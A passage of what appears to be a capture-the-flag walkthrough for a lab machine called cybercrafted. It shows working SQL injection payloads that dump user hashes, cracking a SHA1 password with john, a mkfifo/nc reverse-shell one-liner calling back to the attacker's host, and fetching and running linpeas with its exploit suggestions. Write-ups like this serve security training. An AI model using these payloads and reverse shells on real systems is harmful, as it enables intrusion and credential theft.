2 	3 	session_account_connect_attrs
2 	3 	session_connect_attrs
2 	3 	setup_actors
2 	3 	setup_consumers
2 	3 	setup_instruments
2 	3 	setup_objects
2 	3 	setup_timers
2 	3 	socket_instances
2 	3 	socket_summary_by_event_name
2 	3 	socket_summary_by_instance
2 	3 	status_by_account
2 	3 	status_by_host
2 	3 	status_by_thread
2 	3 	status_by_user
2 	3 	table_handles
2 	3 	table_io_waits_summary_by_index_usage
2 	3 	table_io_waits_summary_by_table
2 	3 	table_lock_waits_summary_by_table
2 	3 	threads
2 	3 	user_variables_by_thread
2 	3 	users
2 	3 	variables_by_thread
2 	3 	host_summary
2 	3 	host_summary_by_file_io
2 	3 	host_summary_by_file_io_type
2 	3 	host_summary_by_stages
2 	3 	host_summary_by_statement_latency
2 	3 	host_summary_by_statement_type
2 	3 	innodb_buffer_stats_by_schema
2 	3 	innodb_buffer_stats_by_table
2 	3 	io_by_thread_by_latency
2 	3 	io_global_by_file_by_bytes
2 	3 	io_global_by_file_by_latency
2 	3 	io_global_by_wait_by_bytes
2 	3 	io_global_by_wait_by_latency
2 	3 	latest_file_io
2 	3 	memory_by_host_by_current_bytes
2 	3 	memory_by_thread_by_current_bytes
2 	3 	memory_by_user_by_current_bytes
2 	3 	memory_global_by_current_bytes
2 	3 	memory_global_total
2 	3 	metrics
2 	3 	ps_check_lost_instrumentation
2 	3 	schema_auto_increment_columns
2 	3 	schema_index_statistics
2 	3 	schema_object_overview
2 	3 	schema_redundant_indexes
2 	3 	schema_table_lock_waits
2 	3 	schema_table_statistics
2 	3 	schema_table_statistics_with_buffer
2 	3 	schema_tables_with_full_table_scans
2 	3 	schema_unused_indexes
2 	3 	session
2 	3 	session_ssl_status
2 	3 	statement_analysis
2 	3 	statements_with_errors_or_warnings
2 	3 	statements_with_full_table_scans
2 	3 	statements_with_runtimes_in_95th_percentile
2 	3 	statements_with_sorting
2 	3 	statements_with_temp_tables
2 	3 	sys_config
2 	3 	user_summary
2 	3 	user_summary_by_file_io
2 	3 	user_summary_by_file_io_type
2 	3 	user_summary_by_stages
2 	3 	user_summary_by_statement_latency
2 	3 	user_summary_by_statement_type
2 	3 	version
2 	3 	wait_classes_global_by_avg_latency
2 	3 	wait_classes_global_by_latency
2 	3 	waits_by_host_by_latency
2 	3 	waits_by_user_by_latency
2 	3 	waits_global_by_latency
2 	3 	x$host_summary
2 	3 	x$host_summary_by_file_io
2 	3 	x$host_summary_by_file_io_type
2 	3 	x$host_summary_by_stages
2 	3 	x$host_summary_by_statement_latency
2 	3 	x$host_summary_by_statement_type
2 	3 	x$innodb_buffer_stats_by_schema
2 	3 	x$innodb_buffer_stats_by_table
2 	3 	x$innodb_lock_waits
2 	3 	x$io_by_thread_by_latency
2 	3 	x$io_global_by_file_by_bytes
2 	3 	x$io_global_by_file_by_latency
2 	3 	x$io_global_by_wait_by_bytes
2 	3 	x$io_global_by_wait_by_latency
2 	3 	x$latest_file_io
2 	3 	x$memory_by_host_by_current_bytes
2 	3 	x$memory_by_thread_by_current_bytes
2 	3 	x$memory_by_user_by_current_bytes
2 	3 	x$memory_global_by_current_bytes
2 	3 	x$memory_global_total
2 	3 	x$processlist
2 	3 	x$ps_digest_95th_percentile_by_avg_us
2 	3 	x$ps_digest_avg_latency_distribution
2 	3 	x$ps_schema_table_statistics_io
2 	3 	x$schema_flattened_keys
2 	3 	x$schema_index_statistics
2 	3 	x$schema_table_lock_waits
2 	3 	x$schema_table_statistics
2 	3 	x$schema_table_statistics_with_buffer
2 	3 	x$schema_tables_with_full_table_scans
2 	3 	x$session
2 	3 	x$statement_analysis
2 	3 	x$statements_with_errors_or_warnings
2 	3 	x$statements_with_full_table_scans
2 	3 	x$statements_with_runtimes_in_95th_percentile
2 	3 	x$statements_with_sorting
2 	3 	x$statements_with_temp_tables
2 	3 	x$user_summary
2 	3 	x$user_summary_by_file_io
2 	3 	x$user_summary_by_file_io_type
2 	3 	x$user_summary_by_stages
2 	3 	x$user_summary_by_statement_latency
2 	3 	x$user_summary_by_statement_type
2 	3 	x$wait_classes_global_by_avg_latency
2 	3 	x$wait_classes_global_by_latency
2 	3 	x$waits_by_host_by_latency
2 	3 	x$waits_by_user_by_latency
2 	3 	x$waits_global_by_latency
2 	3 	admin
2 	3 	stock

and here we can see admin and stock

asdaad' union select 1,2,3,table_name from information_schema.tables where table_schema = 'webapp' # 

Item 	Amount 	Cost
2 	3 	admin
2 	3 	stock

now getting columns

adada' union select 1,2,3,column_name from information_schema.columns where table_name='admin' # 

Item 	Amount 	Cost
2 	3 	id
2 	3 	user
2 	3 	hash

let's get user and hash (pass)

adad' union select 1,2,user,hash from admin # 

or

adad' union select 1,2,user,hash from webapp.admin #

Item 	Amount 	Cost
2 	xXUltimateCreeperXx 	88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
2 	web_flag 	THM{bbe315906038c3a62d9b195001f75008}

another way

adad' union select 1,2,3,group_concat(user,0x3a,hash) from webapp.admin # 

Item 	Amount 	Cost
2 	3 	xXUltimateCreeperXx:88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01,web_flag:THM{bbe315906038c3a62d9b195001f75008}

now we have admin creds

xXUltimateCreeperXx: 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01

using crackstation or john

┌──(witty㉿kali)-[/tmp]
└─$ echo '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01' > hash
                                                                                   
┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
diamond123456789 (?)     
1g 0:00:00:01 DONE (2023-03-08 13:17) 0.6711g/s 5797Kp/s 5797Kc/s 5797KC/s diamond125..diamond123123
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.

Hash
88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
Type
sha1
Result
diamond123456789

so xXUltimateCreeperXx:diamond123456789

go to subdomain admin

after login we can run commands

env

APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20551
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=f9beef5962db4caaa17757d55313b392
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/admin

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.88.215] 43288
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cybercrafted:/var/www/admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cybercrafted:/var/www/admin$ ls -lah /
ls -lah /
total 2.1G
drwxr-xr-x  24 root root 4.0K Sep 30  2021 .
drwxr-xr-x  24 root root 4.0K Sep 30  2021 ..
drwxr-xr-x   2 root root 4.0K Sep 12  2021 bin
drwxr-xr-x   4 root root 4.0K Oct  4  2021 boot
drwxr-xr-x   2 root root 4.0K Jun 26  2021 cdrom
drwxr-xr-x  18 root root 3.7K Mar  8 16:27 dev
drwxr-xr-x 102 root root 4.0K Oct 15  2021 etc
drwxr-xr-x   4 root root 4.0K Jun 27  2021 home
lrwxrwxrwx   1 root root   34 Sep 30  2021 initrd.img -> boot/initrd.img-4.15.0-159-generic
lrwxrwxrwx   1 root root   34 Sep 30  2021 initrd.img.old -> boot/initrd.img-4.15.0-156-generic
drwxr-xr-x  22 root root 4.0K Jun 27  2021 lib
drwxr-xr-x   2 root root 4.0K Jun 26  2021 lib64
drwx------   2 root root  16K Jun 26  2021 lost+found
drwxr-xr-x   2 root root 4.0K Aug  6  2020 media
drwxr-xr-x   2 root root 4.0K Aug  6  2020 mnt
drwxr-xr-x   3 root root 4.0K Jun 27  2021 opt
dr-xr-xr-x 115 root root    0 Mar  8 16:27 proc
drwx------   6 root root 4.0K Oct 15  2021 root
drwxr-xr-x  27 root root  880 Mar  8 16:28 run
drwxr-xr-x   2 root root  12K Sep 12  2021 sbin
drwxr-xr-x   2 root root 4.0K Jun 26  2021 snap
drwxr-xr-x   2 root root 4.0K Aug  6  2020 srv
-rw-------   1 root root 2.0G Jun 26  2021 swap.img
dr-xr-xr-x  13 root root    0 Mar  8 16:27 sys
drwxrwxrwt   2 root root 4.0K Mar  8 18:48 tmp
drwxr-xr-x  11 root root 4.0K Jun 26  2021 usr
drwxr-xr-x  14 root root 4.0K Jun 26  2021 var
lrwxrwxrwx   1 root root   31 Sep 30  2021 vmlinuz -> boot/vmlinuz-4.15.0-159-generic
lrwxrwxrwx   1 root root   31 Sep 30  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-156-generic

let's upload linpeas.sh

www-data@cybercrafted:/tmp$ ls
ls
f
www-data@cybercrafted:/tmp$ file f
file f
f: fifo (named pipe)

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.88.215 - - [08/Mar/2023 13:59:16] "GET /linpeas.sh HTTP/1.1" 200 -


www-data@cybercrafted:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--2023-03-08 18:59:16--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.69K   601KB/s    in 1.3s    

2023-03-08 18:59:18 (601 KB/s) - 'linpeas.sh' saved [828098/828098]

www-data@cybercrafted:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@cybercrafted:/tmp$ ./linpeas.sh

www-data@cybercrafted:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: cybercrafted
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Wed Mar  8 18:59:38 UTC 2023
 18:59:38 up  2:32,  0 users,  load average: 0.15, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-VTuEVHsIdgpXpDitx0F94X53a7kFPwTVHe2U19qeki0oBuUB1XTcz7kQuUT2wR2n	/	ext4	defaults	0 0
/dev/disk/by-uuid/7247eeff-ff6b-40d2-9c0c-57141fd22148	/boot	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
SHLVL=2
OLDPWD=/var/www/admin
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20551
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=f9beef5962db4caaa17757d55313b392
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0819ad558bf7bf22c
instance-action: none
instance-id: i-0ea4e346583aeb1f1
instance-life-cycle: spot
instance-type: t2.small
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-03-08T18:03:50Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:7c:f6:43:73:7b/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role


══╣ User Data


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.4 159524  8516 ?        Ss   16:27   0:03 /sbin/init maybe-ubiquity
root       436  0.0  0.7  94716 15676 ?        S<s  16:27   0:00 /lib/systemd/systemd-journald
root       458  0.0  0.0 105912  1864 ?        Ss   16:27   0:00 /sbin/lvmetad -f
root       465  0.0  0.3  47732  6476 ?        Ss   16:27   0:01 /lib/systemd/systemd-udevd
systemd+   648  0.0  0.1 141788  2996 ?        Ssl  16:27   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   815  0.0  0.2  79916  5120 ?        Ss   16:27   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   833  0.0  0.2  70496  4884 ?        Ss   16:27   0:00 /lib/systemd/systemd-resolved
root       930  0.0  0.2  61992  5448 ?        Ss   16:27   0:00 /lib/systemd/systemd-logind
root       942  0.0  0.0 621516  1660 ?        Ssl  16:27   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
daemon[0m     947  0.0  0.1  28340  2460 ?        Ss   16:27   0:00 /usr/sbin/atd -f
syslog     952  0.0  0.2 263044  4328 ?        Ssl  16:27   0:00 /usr/sbin/rsyslogd -n
root       953  0.0  0.1  30036  3188 ?        Ss   16:27   0:00 /usr/sbin/cron -f
root       956  0.0  0.7 1233656 14660 ?       Ssl  16:27   0:00 /usr/bin/amazon-ssm-agent
root      1224  0.0  1.2 1172588 26248 ?       Sl   16:27   0:00  _ /usr/bin/ssm-agent-worker
message+   964  0.0  0.2  50064  4608 ?        Ss   16:27   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1007  0.0  0.9 185952 20032 ?        Ssl  16:27   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1016  0.0  0.3 288556  7176 ?        Ssl  16:27   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root      1021  0.0  0.1  30276  3568 ?        Ss   16:27   0:00 /usr/bin/SCREEN -DmS cybercrafted /usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.jar nogui
root      1048  2.3  9.4 2384768 191816 pts/0  Ssl+ 16:27   3:32  _ /usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.jar nogui
root      1026  0.0  0.8 169104 17112 ?        Ssl  16:27   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1054  0.0  0.1  14672  2420 ttyS0    Ss+  16:27   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1070  0.0  0.3 291460  7164 ?        Ssl  16:27   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1071  0.0  0.0  14896  1916 tty1     Ss+  16:27   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1119  0.0  0.3  72308  6472 ?        Ss   16:27   0:00 /usr/sbin/sshd -D
root      1136  0.0  0.8 333764 17460 ?        Ss   16:27   0:00 /usr/sbin/apache2 -k start
www-data  2108  0.0  0.7 338736 14368 ?        S    16:56   0:00  _ /usr/sbin/apache2 -k start
www-data  2111  0.0  0.6 338736 14212 ?        S    16:56   0:00  _ /usr/sbin/apache2 -k start
www-data  2185  0.0  0.7 338728 14332 ?        S    16:57   0:00  _ /usr/sbin/apache2 -k start
www-data  2230  0.0  0.6 338728 14192 ?        S    17:00   0:00  _ /usr/sbin/apache2 -k start
www-data  2248  0.0  0.6 338736 14212 ?        S    17:00   0:00  _ /usr/sbin/apache2 -k start
www-data  2249  0.0  0.6 338592 13848 ?        S    17:00   0:00  _ /usr/sbin/apache2 -k start
www-data  2280  0.0  0.6 338592 13940 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
www-data  2951  0.0  0.0   4636   828 ?        S    18:58   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
www-data  2954  0.0  0.0   4680   748 ?        S    18:58   0:00  |       _ cat /tmp/f
www-data  2955  0.0  0.1  18516  3348 ?        S    18:58   0:00  |       _ bash -i
www-data  2960  0.0  0.4  37432  9388 ?        S    18:58   0:00  |       |   _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2961  0.0  0.1  18516  3460 pts/2    Ss   18:58   0:00  |       |       _ /bin/bash
www-data  2976  0.2  0.1   5364  2428 pts/2    S+   18:59   0:00  |       |           _ /bin/sh ./linpeas.sh
www-data  6368  0.0  0.0   5364   888 pts/2    S+   18:59   0:00  |       |               _ /bin/sh ./linpeas.sh
www-data  6372  0.0  0.1  36848  3188 pts/2    R+   18:59   0:00  |       |               |   _ ps fauxwww
www-data  6371  0.0  0.0   5364   888 pts/2    S+   18:59   0:00  |       |               _ /bin/sh ./linpeas.sh
www-data  2956  0.0  0.1  15720  2176 ?        S    18:58   0:00  |       _ nc 10.8.19.103 1337
www-data  2335  0.0  0.7 338736 14300 ?        S    17:07   0:00  _ /usr/sbin/apache2 -k start
www-data  2347  0.0  0.6 338728 14192 ?        S    17:08   0:00  _ /usr/sbin/apache2 -k start
www-data  2393  0.0  0.6 338728 14180 ?        S    17:09   0:00  _ /usr/sbin/apache2 -k start
